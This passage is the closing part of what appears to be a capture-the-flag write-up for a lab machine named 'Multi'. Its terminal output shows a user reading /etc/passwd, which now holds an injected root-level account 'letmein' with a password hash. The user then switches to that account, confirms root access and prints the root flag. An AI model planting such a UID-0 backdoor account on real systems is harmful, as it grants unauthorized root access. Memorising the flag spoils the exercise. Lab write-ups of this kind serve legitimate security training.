> Enter number: 1
...
todd@Multi:/tmp$ tail -1 /etc/passwd
letmein:$6$szol8kPiriu.iJ3R$5Ch1ksmm8B/dOxkD1Yge2Bc2KdfqiGgRKz3FvPp3Kqe5gEUmCsawxrRLIG3Kl69v7t8jv99RlYDvuKF.D81ya0:0:0:letmein:/root:/bin/bash
todd@Multi:/tmp$ su letmein
Password:
root@Multi:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@Multi:/tmp# cat /root/root.txt
flag{root-922c8837565de5bd2e342c65a2e67ef9}
```